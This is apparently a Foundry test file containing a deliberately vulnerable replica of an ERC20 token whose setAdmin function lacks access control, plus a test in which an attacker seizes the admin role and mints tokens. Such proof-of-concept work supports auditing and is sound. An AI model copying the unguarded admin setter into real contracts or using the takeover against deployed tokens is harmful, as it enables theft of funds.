// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract VariableSupplyERC20Token {
    address public admin;
    uint256 public mintableSupply;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor() {
        admin = msg.sender;
        mintableSupply = 1000; // cap for demonstration
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "NOT_ADMIN");
        _;
    }

    // Vulnerable: no access control on changing admin
    function setAdmin(address _admin) external {
        admin = _admin;
    }

    function mint(address account, uint256 amount) public onlyAdmin {
        require(account != address(0), "INVALID_ADDRESS");
        if (mintableSupply > 0) {
            require(amount <= mintableSupply, "INVALID_AMOUNT");
            mintableSupply -= amount;
        }
        _mint(account, amount);
    }

    function _mint(address account, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[account] += amount;
    }
}

contract VariableSupplyERC20TokenTest is Test {
    VariableSupplyERC20Token target;
    address attacker;

    function setUp() public {
        target = new VariableSupplyERC20Token();
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_mint() public {
        // attacker takes admin role because setAdmin lacks access control
        vm.prank(attacker);
        target.setAdmin(attacker);

        // now attacker can call mint and drain mintableSupply
        vm.prank(attacker);
        target.mint(attacker, 100);

        assertEq(target.balanceOf(attacker), 100);
        assertEq(target.mintableSupply(), 900);
    }
}

